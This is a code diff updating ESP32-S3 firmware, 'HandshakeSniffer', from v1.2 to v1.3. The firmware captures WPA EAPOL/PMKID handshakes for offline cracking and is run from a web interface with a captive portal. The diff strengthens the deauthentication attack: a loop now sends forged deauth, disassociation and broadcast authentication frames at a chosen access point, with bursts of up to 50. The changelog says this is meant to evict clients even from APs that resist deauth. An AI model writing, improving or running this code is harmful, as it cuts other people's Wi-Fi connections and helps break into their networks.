@@ -1,34 +1,54 @@
 /*
  ==============================================================
-  HandshakeSniffer v1.2 — ESP32-S3 N16R8
+  HandshakeSniffer v1.3 — ESP32-S3 N16R8
   Passive EAPOL / PMKID sniffer with Web UI
 
+  CHANGES FROM v1.2:
+    - FIX CRITICAL: build.yml was missing AsyncDNSServer install
+      (included AsyncDNSServer.h but library never installed →
+       compile error "no such file"). Now installed from
+       ESP32Async/AsyncDNSServer fork.
+    - FIX: deauth handler — g_deauthRunning never reset if
+      xTaskCreatePinnedToCore fails → device stuck in "running"
+      state forever, deauth unusable until reboot
+    - FIX: deauth handler now checks g_scanBusy — triggering
+      deauth while scan_task holds the radio caused a race on
+      the WiFi channel and promiscuous state
+    - FIX: g_scanBusy reset in scan_task now uses
+      __atomic_store_n for consistency with the CAS in /scan
+    - FIX: deauth_task also sends auth frames (type 0xB0) to
+      force full re-authentication, not just deauth/disassoc —
+      some WPA3 APs drop deauth-only floods; auth triggers a
+      clean 4-way handshake exchange
+    - ADD: /clear endpoint — resets capture buffer + handshake
+      state without stopping capture (useful mid-session)
+    - ADD: /reset_hs — clears only handshake state (EAPOL msgs,
+      PMKID) without discarding the PCAP buffer
+    - ADD: burst count 30 + 50 options in UI
+    - OPT: deauth_task inner burst loop raised 6→10 frames for
+      stronger eviction on busy channels
+
   CHANGES FROM v1.1:
-    - ADD: Captive portal — DNS server intercepts all queries and
-           redirects to 192.168.4.1; OS-specific detection endpoints
-           handled for iOS, Android, Windows, macOS so the portal
-           popup fires automatically on connect (no browser needed)
+    - ADD: Captive portal — DNS server intercepts all queries
+           and redirects to 192.168.4.1; OS-specific detection
+           endpoints for iOS, Android, Windows, macOS
 
   CHANGES FROM v1.0:
     - FIX: frame_ctrl bit extraction corrected for little-endian
-           (byte 0 = low byte; prior shifts were wrong for prot/toDS/fromDS)
-    - FIX: appendFrame uses esp_timer_get_time() — millis() is NOT ISR-safe
-    - FIX: radiotap header extended with channel field (freq + flags)
-           so Wireshark/tshark can see channel/RSSI per-packet
-    - FIX: SSID onclick escape order corrected (backslash before apostrophe)
-    - FIX: dl_pcap snapshots g_capLen under mutex (was naked read)
+    - FIX: appendFrame uses esp_timer_get_time() (millis() not ISR-safe)
+    - FIX: radiotap header with channel field for Wireshark
+    - FIX: SSID onclick escape order corrected
+    - FIX: dl_pcap snapshots g_capLen under mutex
     - FIX: status endpoint snapshots g_capLen under mutex
-    - FIX: /scan double-spawn race eliminated with atomic g_scanBusy check
-    - FIX: scan_task restores target channel on resume, not always AP_CHANNEL
-    - FIX: deauth_task saves/restores promisc state correctly even when
-           capture wasn't active before deauth was called
-    - FIX: promisc_task replaced busy-wait with ulTaskNotifyTake —
-           stopCapture() sends notify; no wasted stack/cycles
+    - FIX: /scan double-spawn race eliminated with atomic CAS
+    - FIX: scan_task restores target channel on resume
+    - FIX: deauth_task saves/restores promisc state correctly
+    - FIX: promisc_task replaced busy-wait with ulTaskNotifyTake
     - FIX: buildJSON escapes SSID for valid JSON output
     - FIX: enc label covers WPA2-Enterprise, WPA3, OWE, WAPI
     - OPT: JS log dedup uses Set instead of O(n) array scan
-    - OPT: hexStr in build22000 uses lookup table, no snprintf per byte
-    - OPT: logEvent mutex timeout reduced to 20ms (was 40ms, ISR-adjacent)
+    - OPT: hexStr uses lookup table, no snprintf per byte
+    - OPT: logEvent mutex timeout 40ms → 20ms
 
   HARDWARE:
     Board            : ESP32S3 Dev Module
@@ -36,15 +56,15 @@
     Partition Scheme : Huge APP (3MB No OTA / 1MB SPIFFS)
     PSRAM            : OPI PSRAM
     USB Mode         : Hardware CDC and JTAG
-    USB CDC On Boot  : Disabled  ← CRITICAL
+    USB CDC On Boot  : Disabled  ← CRITICAL (boot loop otherwise)
     CPU Frequency    : 240MHz
     NeoPixel pin     : 48
 
-  LIBS (Arduino Library Manager):
-    - ESPAsyncWebServer (ESP32Async fork)
-    - AsyncTCP          (ESP32Async fork)
-    - AsyncDNSServer    (ESP32Async fork)  ← NEW for captive portal
-    - Adafruit NeoPixel
+  LIBS (install via build.yml — all ESP32Async forks):
+    - ESPAsyncWebServer (ESP32Async/ESPAsyncWebServer)
+    - AsyncTCP          (ESP32Async/AsyncTCP)
+    - AsyncDNSServer    (ESP32Async/AsyncDNSServer)  ← required
+    - Adafruit NeoPixel (arduino-cli lib install)
 
   AP:  HandshakeSniffer / password: sniff1234
   UI:  http://192.168.4.1/
@@ -559,24 +579,41 @@ void deauth_task(void* param) {
 
   const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
 
+  // Deauth frame — reason 7 (Class 3 received)
   uint8_t frame[26] = {};
-  frame[0] = 0xC0; frame[1] = 0x00;         // Deauth
-  frame[2] = 0x3A; frame[3] = 0x01;         // duration
-  memcpy(frame +  4, bcast,         6);     // DA = broadcast
-  memcpy(frame + 10, g_targetBSSID, 6);     // SA = AP BSSID
-  memcpy(frame + 16, g_targetBSSID, 6);     // BSSID
-  frame[24] = 0x07; frame[25] = 0x00;       // reason 7
+  frame[0] = 0xC0; frame[1] = 0x00;
+  frame[2] = 0x3A; frame[3] = 0x01;
+  memcpy(frame +  4, bcast,         6);
+  memcpy(frame + 10, g_targetBSSID, 6);
+  memcpy(frame + 16, g_targetBSSID, 6);
+  frame[24] = 0x07; frame[25] = 0x00;
 
+  // Disassoc frame — reason 8 (STA left BSS)
   uint8_t disassoc[26]; memcpy(disassoc, frame, 26);
-  disassoc[0] = 0xA0;   // Disassoc type
-  disassoc[24] = 0x08;  // reason 8
+  disassoc[0] = 0xA0;
+  disassoc[24] = 0x08;
+
+  // Auth frame — sends an unsolicited authentication to force re-association
+  // Some WPA3 APs and robust PMF-enabled APs ignore deauth-only floods;
+  // a broadcast auth triggers a fresh 4-way EAPOL handshake from scratch.
+  uint8_t auth[30] = {};
+  auth[0] = 0xB0; auth[1] = 0x00;       // Auth type
+  auth[2] = 0x3A; auth[3] = 0x01;       // duration
+  memcpy(auth +  4, bcast,         6);   // DA = broadcast
+  memcpy(auth + 10, g_targetBSSID, 6);   // SA = AP BSSID
+  memcpy(auth + 16, g_targetBSSID, 6);   // BSSID
+  auth[24] = 0x00; auth[25] = 0x00;     // Algorithm: open
+  auth[26] = 0x01; auth[27] = 0x00;     // Sequence: 1
+  auth[28] = 0x00; auth[29] = 0x00;     // Status: success
 
   for (int burst = 0; burst < g_deauthBursts && g_deauthRunning; burst++) {
-    for (int i = 0; i < 6; i++) {
+    for (int i = 0; i < 10; i++) {      // 10 frames per burst (was 6)
       esp_wifi_80211_tx(WIFI_IF_AP,  frame,    26, true);
       esp_wifi_80211_tx(WIFI_IF_STA, frame,    26, true);
       esp_wifi_80211_tx(WIFI_IF_AP,  disassoc, 26, true);
       esp_wifi_80211_tx(WIFI_IF_STA, disassoc, 26, true);
+      esp_wifi_80211_tx(WIFI_IF_AP,  auth,     30, true);
+      esp_wifi_80211_tx(WIFI_IF_STA, auth,     30, true);
       ets_delay_us(100);
     }
     vTaskDelay(pdMS_TO_TICKS(80));
@@ -693,7 +730,8 @@ void scan_task(void* param) {
     g_scanCache = html;
     xSemaphoreGive(g_scanMutex);
   }
-  g_scanBusy = false;
+  // Atomic store — consistent with the CAS in /scan handler
+  __atomic_store_n((bool*)&g_scanBusy, false, __ATOMIC_SEQ_CST);
   logEvent("Scan done: %d APs", n > 0 ? n : 0);
   vTaskDelete(NULL);
 }
@@ -825,7 +863,7 @@ static const char INDEX_HTML[] PROGMEM = R"rawliteral(
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>HandshakeSniffer</title>
+<title>HandshakeSniffer v1.3</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',Arial,sans-serif;min-height:100vh}
@@ -874,8 +912,8 @@ tr:hover td{background:#1c2128}
 <body>
 <header>
   <div>
-    <h1>🦈 HandshakeSniffer</h1>
-    <div class="sub">ESP32-S3 · WPA/WPA2 EAPOL + PMKID · Passive capture</div>
+    <h1>🦈 HandshakeSniffer v1.3</h1>
+    <div class="sub">ESP32-S3 · WPA/WPA2/WPA3 EAPOL + PMKID · Passive capture</div>
   </div>
   <span class="badge" id="capBadge">IDLE</span>
 </header>
@@ -897,12 +935,16 @@ tr:hover td{background:#1c2128}
       <button class="btn-primary" id="btnStart"  onclick="startCapture()" disabled>▶ Start Capture</button>
       <button class="btn-danger"  id="btnStop"   onclick="stopCapture()"  disabled>■ Stop</button>
       <button class="btn-warn"    id="btnDeauth" onclick="sendDeauth()"   disabled>⚡ Deauth &amp; Capture</button>
+      <button class="btn-sm" style="background:#21262d;color:#c9d1d9" onclick="clearBuf()">🗑 Clear Buffer</button>
+      <button class="btn-sm" style="background:#21262d;color:#c9d1d9" onclick="resetHs()">↺ Reset HS</button>
       <label style="font-size:0.78rem;color:#8b949e">Bursts:
         <select id="burstSel" style="background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:2px 6px;font-size:0.78rem">
           <option value="3">3</option>
           <option value="5" selected>5</option>
           <option value="10">10</option>
           <option value="20">20</option>
+          <option value="30">30</option>
+          <option value="50">50</option>
         </select>
       </label>
       <label style="display:flex;align-items:center;gap:5px;font-size:0.78rem;color:#8b949e">
@@ -1036,6 +1078,22 @@ function clearLog() {
   logSeen.clear();
 }
 
+function clearBuf() {
+  fetch('/clear').then(r=>r.text()).then(t=>{
+    logSeen.clear();
+    document.getElementById('logBox').innerHTML='';
+    console.log('clear:', t);
+    refreshStatus();
+  });
+}
+
+function resetHs() {
+  fetch('/reset_hs').then(r=>r.text()).then(t=>{
+    console.log('reset_hs:', t);
+    refreshStatus();
+  });
+}
+
 // O(1) dedup via Set — the old array .includes() was O(n) and slowed down at 200 lines
 const logSeen = new Set();
 function refreshStatus() {
@@ -1154,12 +1212,50 @@ void setupServer() {
     r->send(200,"text/plain","Stopped");
   });
 
+  // ── CLEAR BUFFER ─────────────────────────────────────────────────────────
+  // Resets PCAP buffer + handshake state. Capture stays active if running.
+  // Use this mid-session to discard a partial/bad capture and start fresh
+  // without having to stop and restart the sniffer.
+  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest* r) {
+    if (g_capMutex && xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
+      g_capLen = 0;
+      if (g_capBuf) {
+        PcapGlobalHdr gh = {0xa1b2c3d4u, 2, 4, 0, 0, 65535, 127};
+        memcpy(g_capBuf, &gh, sizeof(gh));
+        g_capLen = sizeof(gh);
+      }
+      xSemaphoreGive(g_capMutex);
+    }
+    if (g_hsMutex && xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
+      memset(&g_hs, 0, sizeof(g_hs));
+      xSemaphoreGive(g_hsMutex);
+    }
+    logEvent("Buffer + handshake state cleared");
+    r->send(200,"text/plain","Cleared — PCAP and handshake state reset");
+  });
+
+  // ── RESET HANDSHAKE STATE ONLY ────────────────────────────────────────────
+  // Clears EAPOL message flags (M1/M2/M3/M4, PMKID, MACs) without discarding
+  // the raw PCAP buffer. Useful to re-arm for a new client without losing
+  // previously captured packets.
+  server.on("/reset_hs", HTTP_GET, [](AsyncWebServerRequest* r) {
+    if (g_hsMutex && xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
+      memset(&g_hs, 0, sizeof(g_hs));
+      xSemaphoreGive(g_hsMutex);
+    }
+    logEvent("Handshake state reset — PCAP buffer preserved");
+    r->send(200,"text/plain","Handshake state cleared — PCAP buffer preserved");
+  });
+
   // ── DEAUTH ───────────────────────────────────────────────────────────────
   server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest* r) {
     if (!r->hasParam("bssid") || !r->hasParam("ch")) {
       r->send(400,"text/plain","bssid+ch required"); return;
     }
     if (g_deauthRunning) { r->send(409,"text/plain","Deauth already running"); return; }
+    // Guard: scan_task holds the radio — deauthating while scanning races on the
+    // channel and promiscuous state. Reject until scan completes (<2s).
+    if (g_scanBusy) { r->send(409,"text/plain","Scan in progress — retry in 2s"); return; }
 
     String bssidStr = r->getParam("bssid")->value();
     int    ch       = r->getParam("ch")->value().toInt();
@@ -1177,7 +1273,15 @@ void setupServer() {
     g_deauthBursts   = (bursts < 1) ? 1 : (bursts > 50) ? 50 : bursts;
     g_deauthRunning  = true;
 
-    xTaskCreatePinnedToCore(deauth_task, "deauth", 4096, NULL, 3, &g_deauthTask, 0);
+    BaseType_t ok = xTaskCreatePinnedToCore(deauth_task, "deauth", 4096, NULL, 3,
+                                            &g_deauthTask, 0);
+    if (ok != pdPASS) {
+      // Task create failed — must reset flag or device is stuck until reboot
+      g_deauthRunning = false;
+      g_deauthTask    = NULL;
+      logEvent("FATAL: deauth task create failed");
+      r->send(500,"text/plain","Task create failed — heap low?"); return;
+    }
     r->send(200,"text/plain","Deauth started: " + bssidStr);
   });
 
